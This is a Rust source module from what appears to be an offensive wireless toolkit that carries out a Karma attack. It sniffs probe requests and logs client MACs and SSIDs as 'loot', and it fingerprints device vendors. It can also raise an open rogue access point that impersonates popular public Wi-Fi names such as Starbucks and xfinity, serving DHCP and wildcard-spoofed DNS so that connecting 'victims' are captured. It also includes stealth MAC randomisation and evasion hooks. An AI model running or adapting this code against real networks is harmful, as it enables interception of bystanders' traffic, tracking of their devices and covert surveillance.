//! Karma Attack Module
//!
//! Responds to ALL probe requests with matching responses,
//! capturing devices looking for known networks.
//!
//! This is highly effective against devices with saved networks.

use std::collections::HashMap;
use std::fs;
use std::io::Write;
use std::net::{IpAddr, Ipv4Addr};
use std::path::PathBuf;
use std::sync::{
    atomic::{AtomicBool, Ordering},
    Arc, Mutex,
};
use std::thread;
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};

use chrono::Local;
use log::warn;
use rustyjack_netlink::{
    AccessPoint, ApConfig, ApSecurity, DhcpConfig, DhcpServer, DnsConfig, DnsRule, DnsServer,
};

use crate::capture::{CaptureFilter, PacketCapture};
use crate::error::{Result, WirelessError};
use crate::frames::{FrameSubtype, FrameType};
use crate::interface::WirelessInterface;
use crate::netlink_helpers::{
    netlink_add_address, netlink_flush_addresses, netlink_set_interface_down,
    netlink_set_interface_up, select_hw_mode,
};
use crate::probe::ProbeSniffer;

fn arp_clients(interface: &str) -> Vec<String> {
    let mut clients = Vec::new();
    let mut seen = std::collections::HashSet::new();
    if let Ok(contents) = fs::read_to_string("/proc/net/arp") {
        for (idx, line) in contents.lines().enumerate() {
            if idx == 0 {
                continue;
            }
            let parts: Vec<&str> = line.split_whitespace().collect();
            if parts.len() < 6 {
                continue;
            }
            if parts[5] != interface {
                continue;
            }
            let mac = parts[3];
            if mac == "00:00:00:00:00:00" {
                continue;
            }
            if seen.insert(mac.to_string()) {
                clients.push(mac.to_string());
            }
        }
    }
    clients
}

struct DhcpRuntime {
    handle: Option<thread::JoinHandle<()>>,
    running: Arc<Mutex<bool>>,
}

/// Karma attack configuration
#[derive(Debug, Clone)]
pub struct KarmaConfig {
    /// Interface to use (must support monitor + injection)
    pub interface: String,
    /// Duration in seconds (0 = indefinite)
    pub duration: u32,
    /// Channel to operate on (0 = hop)
    pub channel: u8,
    /// Whitelist - only respond to these SSIDs (empty = respond to all)
    pub ssid_whitelist: Vec<String>,
    /// Blacklist - never respond to these SSIDs
    pub ssid_blacklist: Vec<String>,
    /// Only target specific client MACs (empty = all clients)
    pub target_clients: Vec<String>,
    /// Capture handshakes when clients connect
    pub capture_handshakes: bool,
    /// Log all probe requests
    pub log_probes: bool,
    /// Output directory for captures
    pub output_dir: PathBuf,
    /// Use stealth MAC (randomize before attack)
    pub stealth_mac: bool,
}

impl Default for KarmaConfig {
    fn default() -> Self {
        Self {
            interface: "wlan0".to_string(),
            duration: 300, // 5 minutes
            channel: 6,
            ssid_whitelist: Vec::new(),
            ssid_blacklist: vec![
                // Default blacklist - don't impersonate these
                "".to_string(), // Hidden networks
            ],
            target_clients: Vec::new(),
            capture_handshakes: true,
            log_probes: true,
            output_dir: PathBuf::from("/tmp/karma"),
            stealth_mac: true,
        }
    }
}

/// A captured probe request
#[derive(Debug, Clone)]
pub struct CapturedProbe {
    /// Client MAC address
    pub client_mac: String,
    /// SSID the client is looking for
    pub ssid: String,
    /// Signal strength
    pub signal_dbm: i32,
    /// Timestamp
    pub timestamp: u64,
    /// Whether we responded
    pub responded: bool,
}

/// A client that connected to our fake AP
#[derive(Debug, Clone)]
pub struct KarmaVictim {
    /// Client MAC address
    pub client_mac: String,
    /// SSID they connected to
    pub ssid: String,
    /// Our fake BSSID for this SSID
    pub fake_bssid: String,
    /// Time of connection
    pub connected_at: u64,
    /// Whether we captured handshake
    pub handshake_captured: bool,
    /// Path to handshake file
    pub handshake_file: Option<PathBuf>,
    /// Device fingerprint if identified
    pub device_type: Option<String>,
}

/// Statistics from Karma attack
#[derive(Debug, Clone, Default)]
pub struct KarmaStats {
    /// Total probe requests seen
    pub probes_seen: u64,
    /// Probe requests we responded to
    pub probes_responded: u64,
    /// Unique SSIDs probed for
    pub unique_ssids: usize,
    /// Unique clients seen
    pub unique_clients: usize,
    /// Clients that connected
    pub victims: usize,
    /// Handshakes captured
    pub handshakes: usize,
    /// Duration so far
    pub duration_secs: u32,
}

/// Result of Karma attack
#[derive(Debug, Clone)]
pub struct KarmaResult {
    pub stats: KarmaStats,
    pub probes: Vec<CapturedProbe>,
    pub victims: Vec<KarmaVictim>,
    pub ssids_seen: Vec<String>,
    pub log_file: PathBuf,
}

/// Karma attack state
pub struct KarmaAttack {
    config: KarmaConfig,
    running: Arc<AtomicBool>,
    probes: Arc<Mutex<Vec<CapturedProbe>>>,
    victims: Arc<Mutex<Vec<KarmaVictim>>>,
    ssid_to_bssid: Arc<Mutex<HashMap<String, String>>>,
    stats: Arc<Mutex<KarmaStats>>,
}

impl KarmaAttack {
    pub fn new(config: KarmaConfig) -> Self {
        Self {
            config,
            running: Arc::new(AtomicBool::new(false)),
            probes: Arc::new(Mutex::new(Vec::new())),
            victims: Arc::new(Mutex::new(Vec::new())),
            ssid_to_bssid: Arc::new(Mutex::new(HashMap::new())),
            stats: Arc::new(Mutex::new(KarmaStats::default())),
        }
    }

    /// Generate a random BSSID for a fake AP
    fn generate_bssid() -> String {
        use std::time::{SystemTime, UNIX_EPOCH};

        let seed = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_nanos() as u64;

        let mut state = seed;
        let mut bytes = [0u8; 6];
        for i in 0..6 {
            state = state.wrapping_mul(6364136223846793005).wrapping_add(1);
            bytes[i] = (state >> 33) as u8;
        }

        // Set locally administered bit, clear multicast
        bytes[0] = (bytes[0] | 0x02) & 0xFE;

        format!(
            "{:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X}",
            bytes[0], bytes[1], bytes[2], bytes[3], bytes[4], bytes[5]
        )
    }

    /// Get or create a BSSID for an SSID
    fn get_bssid_for_ssid(&self, ssid: &str) -> String {
        let mut map = match self.ssid_to_bssid.lock() {
            Ok(m) => m,
            Err(e) => {
                log::warn!(
                    "[KARMA] BSSID map mutex poisoned, recovering: {}",
                    e
                );
                e.into_inner()
            }
        };
        map.entry(ssid.to_string())
            .or_insert_with(Self::generate_bssid)
            .clone()
    }

    /// Check if we should respond to this probe
    fn should_respond(&self, ssid: &str, client_mac: &str) -> bool {
        // Check blacklist
        if self.config.ssid_blacklist.contains(&ssid.to_string()) {
            return false;
        }

        // Check whitelist (if not empty)
        if !self.config.ssid_whitelist.is_empty() {
            if !self.config.ssid_whitelist.contains(&ssid.to_string()) {
                return false;
            }
        }

        // Check target clients (if specified)
        if !self.config.target_clients.is_empty() {
            if !self
                .config
                .target_clients
                .iter()
                .any(|c| c.eq_ignore_ascii_case(client_mac))
            {
                return false;
            }
        }

        true
    }

    /// Handle a probe request
    pub fn handle_probe(&self, client_mac: &str, ssid: &str, signal_dbm: i32) {
        let timestamp = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_secs();

        let should_respond = self.should_respond(ssid, client_mac);

        // Record probe
        let probe = CapturedProbe {
            client_mac: client_mac.to_string(),
            ssid: ssid.to_string(),
            signal_dbm,
            timestamp,
            responded: should_respond,
        };

        if self.config.log_probes {
            if let Ok(mut probes) = self.probes.lock() {
                probes.push(probe);
            } else {
                warn!("[KARMA] probe log mutex poisoned; skipping probe record");
            }
        }

        // Update stats
        {
            if let Ok(mut stats) = self.stats.lock() {
                stats.probes_seen += 1;
                if should_respond {
                    stats.probes_responded += 1;
                }
            } else {
                warn!("[KARMA] stats mutex poisoned; skipping stats update");
            }
        }

        // Respond if appropriate
        if should_respond && !ssid.is_empty() {
            // In real implementation, this would inject the probe response
            // self.inject_probe_response(ssid, client_mac);
        }
    }

    /// Record a victim connection
    pub fn record_victim(&self, client_mac: &str, ssid: &str, handshake_file: Option<PathBuf>) {
        let timestamp = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_secs();

        // Get probes from this client for fingerprinting
        let probes: Vec<String> = self
            .probes
            .lock()
            .map(|p| {
                p.iter()
                    .filter(|p| p.client_mac == client_mac)
                    .map(|p| p.ssid.clone())
                    .collect()
            })
            .unwrap_or_default();

        let device_type = self.fingerprint_device(client_mac, &probes);

        let handshake_captured = handshake_file.is_some();

        let victim = KarmaVictim {
            client_mac: client_mac.to_string(),
            ssid: ssid.to_string(),
            fake_bssid: self.get_bssid_for_ssid(ssid),
            connected_at: timestamp,
            handshake_captured,
            handshake_file,
            device_type,
        };

        if let Ok(mut victims) = self.victims.lock() {
            victims.push(victim);
        } else {
            warn!("[KARMA] victims mutex poisoned; skipping victim record");
        }

        if let Ok(mut stats) = self.stats.lock() {
            stats.victims += 1;
            if handshake_captured {
                stats.handshakes += 1;
            }
        } else {
            warn!("[KARMA] stats mutex poisoned; skipping victim counters");
        }
    }

    /// Get current statistics
    pub fn get_stats(&self) -> KarmaStats {
        let mut stats = self.stats.lock().map(|s| s.clone()).unwrap_or_default();

        // Update unique counts
        if let Ok(probes) = self.probes.lock() {
            let unique_ssids: std::collections::HashSet<_> =
                probes.iter().map(|p| &p.ssid).collect();
            let unique_clients: std::collections::HashSet<_> =
                probes.iter().map(|p| &p.client_mac).collect();

            stats.unique_ssids = unique_ssids.len();
            stats.unique_clients = unique_clients.len();
        } else {
            warn!("[KARMA] probe log mutex poisoned; unique counts unavailable");
        }

        stats
    }

    /// Simple device fingerprinting placeholder based on OUI and probe count.
    fn fingerprint_device(&self, client_mac: &str, probes: &[String]) -> Option<String> {
        let oui = client_mac.get(0..8).unwrap_or("");
        let vendor = match oui.to_uppercase().as_str() {
            "F4:0F:24" | "A4:83:E7" | "AC:BC:32" => "Apple",
            "00:1A:8A" | "8C:F5:A3" | "CC:07:AB" => "Samsung",
            "F8:8F:CA" | "94:EB:2C" => "Google",
            "00:1E:67" | "8C:F1:12" => "Intel",
            _ => "Unknown",
        };

        let probe_count = probes.len();
        let device_type = if vendor == "Apple" {
            if probe_count > 10 {
                "iPhone"
            } else {
                "MacBook/iPad"
            }
        } else if vendor == "Samsung" {
            "Android (Samsung)"
        } else if vendor == "Google" {
            "Android (Pixel)"
        } else {
            "Unknown"
        };

        Some(device_type.to_string())
    }

    /// Get result summary
    pub fn get_result(&self) -> KarmaResult {
        let probes = self.probes.lock().map(|p| p.clone()).unwrap_or_default();
        let victims = self.victims.lock().map(|v| v.clone()).unwrap_or_default();

        let ssids_seen: Vec<String> = {
            let ssids: std::collections::HashSet<String> =
                probes.iter().map(|p| p.ssid.clone()).collect();
            ssids.into_iter().collect()
        };
        let log_file = if rustyjack_evasion::logs_enabled() {
            self.config.output_dir.join("karma_log.txt")
        } else {
            PathBuf::new()
        };

        KarmaResult {
            stats: self.get_stats(),
            probes,
            victims,
            ssids_seen,
            log_file,
        }
    }

    /// Check if attack is running
    pub fn is_running(&self) -> bool {
        self.running.load(Ordering::SeqCst)
    }

    /// Stop the attack
    pub fn stop(&self) {
        self.running.store(false, Ordering::SeqCst);
    }
}

/// Quick function to start a Karma attack
pub fn start_karma(config: KarmaConfig) -> KarmaAttack {
    KarmaAttack::new(config)
}

/// Karma execution result
#[derive(Debug, Clone)]
pub struct KarmaExecutionResult {
    /// Attack result
    pub result: KarmaResult,
    /// Path where loot was saved
    pub loot_path: PathBuf,
}

/// Execute a full Karma attack using passive probe sniffing
///
/// This function:
/// 1. Sets up monitor mode for probe sniffing
/// 2. Captures all probe requests from nearby devices
/// 3. Logs all probes and discovered SSIDs
/// 4. Saves loot to structured directories
///
/// # Arguments
/// * `config` - Karma configuration
/// * `loot_base` - Base loot directory
/// * `progress` - Callback for progress updates
pub fn execute_karma<F>(
    config: KarmaConfig,
    loot_base: Option<&str>,
    progress: F,
) -> Result<KarmaExecutionResult>
where
    F: Fn(&str) + Send + Sync + 'static,
{
    let mut config = config;
    let logging_enabled = rustyjack_evasion::logs_enabled();
    if !logging_enabled {
        config.log_probes = false;
    }

    // Create loot directory
    let base = loot_base.unwrap_or("loot/Wireless/karma");
    let timestamp = Local::now().format("%Y%m%d_%H%M%S").to_string();
    let loot_dir = PathBuf::from(base).join(&timestamp);

    fs::create_dir_all(&loot_dir)
        .map_err(|e| WirelessError::System(format!("Failed to create loot dir: {}", e)))?;

    progress("Starting Karma attack...");

    // Create attack state
    let attack = Arc::new(KarmaAttack::new(config.clone()));
    attack.running.store(true, Ordering::SeqCst);

    // Create log files when allowed
    let log_to_file = logging_enabled && config.log_probes;
    let (probe_log_path, probe_log) = if log_to_file {
        let path = loot_dir.join("probes.log");
        let mut file = fs::File::create(&path)
            .map_err(|e| WirelessError::System(format!("Failed to create probe log: {}", e)))?;

        writeln!(file, "# Karma Attack Probe Log").ok();
        writeln!(
            file,
            "# Started: {}",
            Local::now().format("%Y-%m-%d %H:%M:%S")
        )
        .ok();
        writeln!(file, "# Format: timestamp,client_mac,ssid,signal_dbm").ok();
        (path, Some(Arc::new(Mutex::new(file))))
    } else {
        (PathBuf::new(), None)
    };
    let summary_path = if logging_enabled {
        Some(loot_dir.join("summary.txt"))
    } else {
        None
    };

    // Setup interface for monitor mode
    let mut interface = WirelessInterface::new(&config.interface)?;
    interface.set_monitor_mode()?;

    if config.channel > 0 {
        if let Err(e) = interface.set_channel(config.channel) {
            progress(&format!("Warning: Failed to set channel: {}", e));
        }
    }

    progress(&format!(
        "Monitor mode enabled on {} (channel {})",
        config.interface, config.channel
    ));

    // Create packet capture with probe request filter
    let mut capture = PacketCapture::new(&config.interface)?;
    let filter = CaptureFilter {
        frame_types: Some(vec![FrameType::Management]),
        subtypes: Some(vec![FrameSubtype::ProbeRequest]),
        ..Default::default()
    };
    capture.set_filter(filter);

    let probe_sniffer = ProbeSniffer::from_name(&config.interface)?;

    let attack_clone = Arc::clone(&attack);
    let progress = Arc::new(progress);
    let start = Instant::now();
    let duration = Duration::from_secs(config.duration as u64);

    // Channel hopping if configured
    let hop_channels: Vec<u8> = if config.channel == 0 {
        vec![1, 6, 11, 2, 7, 12, 3, 8, 13, 4, 9, 5, 10]
    } else {
        vec![config.channel]
    };
    let mut channel_index = 0;
    let mut last_hop = Instant::now();
    let hop_interval = Duration::from_millis(500);

    // Main capture loop
    while attack.is_running() {
        if duration.as_secs() > 0 && start.elapsed() >= duration {
            break;
        }

        // Channel hopping
        if hop_channels.len() > 1 && last_hop.elapsed() >= hop_interval {
            channel_index = (channel_index + 1) % hop_channels.len();
            if let Err(e) = interface.set_channel(hop_channels[channel_index]) {
                log::debug!("Channel hop failed: {}", e);
            }
            last_hop = Instant::now();
        }

        // Capture packets
        match capture.next_packet() {
            Ok(Some(packet)) => {
                if let Some(probe) = probe_sniffer.parse_probe_request(&packet) {
                    // Handle the probe
                    let signal = probe.signal_dbm.unwrap_or(-80);
                    let ssid = probe.ssid.as_deref().unwrap_or("");
                    attack_clone.handle_probe(&probe.client_mac.to_string(), ssid, signal.into());

                    // Log to file
                    if let Some(log_handle) = probe_log.as_ref() {
                        if let Ok(mut log) = log_handle.lock() {
                            writeln!(
                                log,
                                "{},{},{},{}",
                                Local::now().format("%H:%M:%S"),
                                probe.client_mac,
                                ssid,
                                signal
                            )
                            .ok();
                        }
                    }

                    // Progress update for new SSIDs
                    let stats = attack_clone.get_stats();
                    if stats.probes_seen % 10 == 0 {
                        progress(&format!(
                            "Karma: {} probes, {} SSIDs, {} clients",
                            stats.probes_seen, stats.unique_ssids, stats.unique_clients
                        ));
                    }
                }
            }
            Ok(None) => {}
            Err(e) => {
                log::debug!("Capture error: {}", e);
            }
        }
    }

    // Get final results
    let mut result = attack.get_result();
    result.log_file = probe_log_path.clone();

    // Write summary if logging is enabled
    if let Some(summary_path) = summary_path.as_ref() {
        let mut summary = fs::File::create(summary_path)
            .map_err(|e| WirelessError::System(format!("Failed to create summary: {}", e)))?;

        writeln!(summary, "Karma Attack Summary").ok();
        writeln!(
            summary,
            "Completed: {}",
            Local::now().format("%Y-%m-%d %H:%M:%S")
        )
        .ok();
        writeln!(summary, "Duration: {:?}", start.elapsed()).ok();
        writeln!(summary, "").ok();
        writeln!(summary, "Statistics:").ok();
        writeln!(summary, "  Probes seen: {}", result.stats.probes_seen).ok();
        writeln!(summary, "  Unique SSIDs: {}", result.stats.unique_ssids).ok();
        writeln!(summary, "  Unique clients: {}", result.stats.unique_clients).ok();
        writeln!(summary, "  Victims: {}", result.stats.victims).ok();
        writeln!(summary, "").ok();
        writeln!(summary, "SSIDs discovered:").ok();
        for ssid in &result.ssids_seen {
            if !ssid.is_empty() {
                writeln!(summary, "  - {}", ssid).ok();
            }
        }
    }

    // Also save SSIDs to a separate file for easy processing
    let ssids_path = loot_dir.join("ssids.txt");
    let mut ssids_file = fs::File::create(&ssids_path)
        .map_err(|e| WirelessError::System(format!("Failed to create ssids file: {}", e)))?;

    for ssid in &result.ssids_seen {
        if !ssid.is_empty() {
            writeln!(ssids_file, "{}", ssid).ok();
        }
    }

    // Restore managed mode
    if let Err(e) = interface.set_managed_mode() {
        log::warn!("Failed to restore managed mode: {}", e);
    }

    progress(&format!(
        "Karma complete: {} probes, {} SSIDs, {} clients",
        result.stats.probes_seen, result.stats.unique_ssids, result.stats.unique_clients
    ));

    Ok(KarmaExecutionResult {
        result,
        loot_path: loot_dir,
    })
}

/// Karma attack with Rust-native AP - responds to specific SSIDs
///
/// Unlike execute_karma which only sniffs probes, this variant actually
/// creates fake APs for captured SSIDs using the Rust AP stack.
pub fn execute_karma_with_ap<F>(
    config: KarmaConfig,
    ap_interface: &str,
    loot_base: Option<&str>,
    progress: F,
) -> Result<KarmaExecutionResult>
where
    F: Fn(&str) + Send + Sync + 'static,
{
    let mut config = config;
    let logging_enabled = rustyjack_evasion::logs_enabled();
    if !logging_enabled {
        config.log_probes = false;
    }

    let base = loot_base.unwrap_or("loot/Wireless/karma");
    let timestamp = Local::now().format("%Y%m%d_%H%M%S").to_string();
    let loot_dir = PathBuf::from(base).join(&timestamp);

    fs::create_dir_all(&loot_dir)
        .map_err(|e| WirelessError::System(format!("Failed to create loot dir: {}", e)))?;

    progress("Starting Karma attack with AP...");

    let attack = Arc::new(KarmaAttack::new(config.clone()));
    attack.running.store(true, Ordering::SeqCst);

    // Use common target SSIDs for the attack
    let target_ssids = if config.ssid_whitelist.is_empty() {
        common_target_ssids()
            .iter()
            .take(5)
            .map(|s| s.to_string())
            .collect::<Vec<_>>()
    } else {
        config.ssid_whitelist.clone()
    };

    // We'll create AP config for the first target SSID
    let primary_ssid = target_ssids
        .first()
        .cloned()
        .unwrap_or("FreeWiFi".to_string());

    // Setup AP interface
    let _ = netlink_set_interface_down(ap_interface);
    let _ = netlink_flush_addresses(ap_interface);

    let addr: IpAddr = "192.168.4.1"
        .parse()
        .map_err(|e| WirelessError::System(format!("Failed to parse IP: {}", e)))?;
    netlink_add_address(ap_interface, addr, 24)?;

    let _ = netlink_set_interface_up(ap_interface);

    let gateway_ip = Ipv4Addr::new(192, 168, 4, 1);
    let channel = if config.channel == 0 { 6 } else { config.channel };

    let ap_config = ApConfig {
        interface: ap_interface.to_string(),
        ssid: primary_ssid.clone(),
        channel,
        security: ApSecurity::Open,
        hidden: false,
        beacon_interval: 100,
        max_clients: 0,
        dtim_period: 2,
        hw_mode: select_hw_mode(ap_interface, channel),
    };

    let mut ap = start_access_point(ap_config)?;
    let mut dhcp = match start_dhcp_server(ap_interface, gateway_ip, logging_enabled) {
        Ok(runtime) => runtime,
        Err(e) => {
            stop_ap_best_effort(&mut ap);
            return Err(e);
        }
    };
    let mut dns = match start_dns_server(ap_interface, gateway_ip, logging_enabled) {
        Ok(server) => server,
        Err(e) => {
            stop_dhcp_runtime(&mut dhcp);
            stop_ap_best_effort(&mut ap);
            return Err(e);
        }
    };

    progress(&format!(
        "Karma AP '{}' running on {} (Rust AP)",
        primary_ssid, ap_interface
    ));

    // Wait for attack duration
    let start = Instant::now();
    let duration = Duration::from_secs(config.duration as u64);

    while start.elapsed() < duration && attack.is_running() {
        thread::sleep(Duration::from_secs(5));

        let clients = arp_clients(ap_interface);
        if !clients.is_empty() {
            progress(&format!("Karma AP: {} clients connected", clients.len()));
            for mac in clients {
                attack.record_victim(&mac, &primary_ssid, None);
            }
        }
    }

    // Cleanup
    stop_dhcp_runtime(&mut dhcp);
    let _ = dns.stop();
    stop_ap_best_effort(&mut ap);

    // Reset interface
    let _ = netlink_flush_addresses(ap_interface);

    let result = attack.get_result();

    // Write summary if logging is enabled
    if logging_enabled {
        let summary_path = loot_dir.join("summary.txt");
        let mut summary = fs::File::create(&summary_path)?;

        writeln!(summary, "Karma AP Attack Summary").ok();
        writeln!(summary, "Primary SSID: {}", primary_ssid).ok();
        writeln!(summary, "Duration: {:?}", start.elapsed()).ok();
        writeln!(summary, "Victims: {}", result.stats.victims).ok();
    }

    progress(&format!(
        "Karma AP complete: {} victims",
        result.stats.victims
    ));

    Ok(KarmaExecutionResult {
        result,
        loot_path: loot_dir,
    })
}

fn stop_ap_best_effort(ap: &mut AccessPoint) {
    if let Ok(handle) = tokio::runtime::Handle::try_current() {
        let _ = handle.block_on(async { ap.stop().await });
    } else if let Ok(rt) = tokio::runtime::Runtime::new() {
        let _ = rt.block_on(async { ap.stop().await });
    }
}

fn start_access_point(ap_config: ApConfig) -> Result<AccessPoint> {
    let mut ap = AccessPoint::new(ap_config)
        .map_err(|e| WirelessError::System(format!("Failed to create Access Point: {}", e)))?;

    let start_result = tokio::runtime::Handle::try_current()
        .map(|handle| {
            handle.block_on(async {
                ap.start()
                    .await
                    .map_err(|e| WirelessError::System(format!("AP start failed: {}", e)))
            })
        })
        .unwrap_or_else(|_| {
            tokio::runtime::Runtime::new()
                .map_err(|e| WirelessError::System(format!("Failed to create tokio runtime: {}", e)))
                .and_then(|rt| {
                    rt.block_on(async {
                        ap.start()
                            .await
                            .map_err(|e| WirelessError::System(format!("AP start failed: {}", e)))
                    })
                })
        });

    if let Err(e) = start_result {
        return Err(e);
    }

    thread::sleep(Duration::from_secs(2));
    Ok(ap)
}

fn start_dhcp_server(
    interface: &str,
    gateway_ip: Ipv4Addr,
    logging_enabled: bool,
) -> Result<DhcpRuntime> {
    let dhcp_cfg = DhcpConfig {
        interface: interface.to_string(),
        server_ip: gateway_ip,
        subnet_mask: Ipv4Addr::new(255, 255, 255, 0),
        range_start: Ipv4Addr::new(192, 168, 4, 10),
        range_end: Ipv4Addr::new(192, 168, 4, 100),
        router: Some(gateway_ip),
        dns_servers: vec![gateway_ip],
        lease_time_secs: 43200,
        log_packets: logging_enabled,
    };

    let mut server = DhcpServer::new(dhcp_cfg.clone())
        .map_err(|e| WirelessError::System(format!("Failed to create DHCP server: {}", e)))?;
    let running_handle = server.running_handle();
    server
        .start()
        .map_err(|e| WirelessError::System(format!("Failed to start DHCP server: {}", e)))?;
    log::info!(
        "DHCP server bound on {} offering {}-{}",
        interface,
        dhcp_cfg.range_start,
        dhcp_cfg.range_end
    );

    let handle = thread::spawn(move || {
        if let Err(e) = server.serve() {
            log::error!("DHCP server exited with error: {}", e);
        }
    });

    Ok(DhcpRuntime {
        handle: Some(handle),
        running: running_handle,
    })
}

fn stop_dhcp_runtime(runtime: &mut DhcpRuntime) {
    if let Ok(mut running) = runtime.running.lock() {
        *running = false;
    }
    if let Some(handle) = runtime.handle.take() {
        let _ = handle.join();
    }
}

fn start_dns_server(
    interface: &str,
    gateway_ip: Ipv4Addr,
    logging_enabled: bool,
) -> Result<DnsServer> {
    let dns_cfg = DnsConfig {
        interface: interface.to_string(),
        listen_ip: gateway_ip,
        default_rule: DnsRule::WildcardSpoof(gateway_ip),
        custom_rules: std::collections::HashMap::new(),
        upstream_dns: None,
        log_queries: logging_enabled,
    };

    let mut server = DnsServer::new(dns_cfg)
        .map_err(|e| WirelessError::System(format!("Failed to create DNS server: {}", e)))?;
    server
        .start()
        .map_err(|e| WirelessError::System(format!("Failed to start DNS server: {}", e)))?;
    log::info!("DNS server bound on {} ({})", interface, gateway_ip);

    Ok(server)
}

/// List of commonly probed SSIDs that are good Karma targets
pub fn common_target_ssids() -> Vec<&'static str> {
    vec![
        "attwifi",
        "xfinity",
        "XFINITY",
        "Starbucks WiFi",
        "Google Starbucks",
        "McDonald's Free WiFi",
        "BTWifi-with-FON",
        "AndroidAP",
        "iPhone",
        "_Free_WiFi",
        "FreeWifi",
        "Guest",
        "NETGEAR",
        "linksys",
        "default",
        "HOME-",
        "DIRECT-",
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_bssid_generation() {
        let bssid = KarmaAttack::generate_bssid();
        assert_eq!(bssid.len(), 17);
        assert_eq!(bssid.matches(':').count(), 5);

        // Check locally administered bit
        let first_byte = u8::from_str_radix(&bssid[0..2], 16).unwrap();
        assert!(first_byte & 0x02 != 0);
    }

    #[test]
    fn test_should_respond_blacklist() {
        let mut config = KarmaConfig::default();
        config.ssid_blacklist.push("BlockedNetwork".to_string());

        let attack = KarmaAttack::new(config);

        assert!(!attack.should_respond("BlockedNetwork", "AA:BB:CC:DD:EE:FF"));
        assert!(attack.should_respond("AllowedNetwork", "AA:BB:CC:DD:EE:FF"));
    }

    #[test]
    fn test_should_respond_whitelist() {
        let mut config = KarmaConfig::default();
        config.ssid_whitelist.push("TargetNetwork".to_string());

        let attack = KarmaAttack::new(config);

        assert!(attack.should_respond("TargetNetwork", "AA:BB:CC:DD:EE:FF"));
        assert!(!attack.should_respond("OtherNetwork", "AA:BB:CC:DD:EE:FF"));
    }
}
